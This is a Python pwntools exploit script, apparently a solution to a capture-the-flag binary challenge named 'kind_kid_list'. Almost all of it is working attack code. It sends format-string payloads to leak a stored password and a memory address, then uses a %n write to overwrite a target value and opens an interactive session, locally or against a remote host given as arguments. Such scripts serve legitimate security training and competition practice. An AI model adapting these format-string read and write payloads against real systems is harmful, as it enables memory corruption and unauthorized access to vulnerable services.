#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('kind_kid_list')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
brva 0x016B2
brva 0x01681
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    """
    Leak password, add to kind list & leak naught list address
    """

    payload = f"%31$s".encode()
    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b":", payload)
    password = io.recvline()[1:8]

    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b":", password)
    io.sendlineafter(b":", b"wyv3rn")

    payload = f"%39$p".encode()
    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b":", payload)
    nlist = int(io.recvuntil(b'is')[:-3].ljust(8, b'\x00'), 16) - 0x1d8
    info("naughty list: %#x", nlist)

    """
    Change naught list value
    """

    payload = f"A%8$ln".encode()

    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b":", password)
    io.sendlineafter(b":", p64(nlist))

    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b":", payload)


    io.sendline(b"3")
    

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

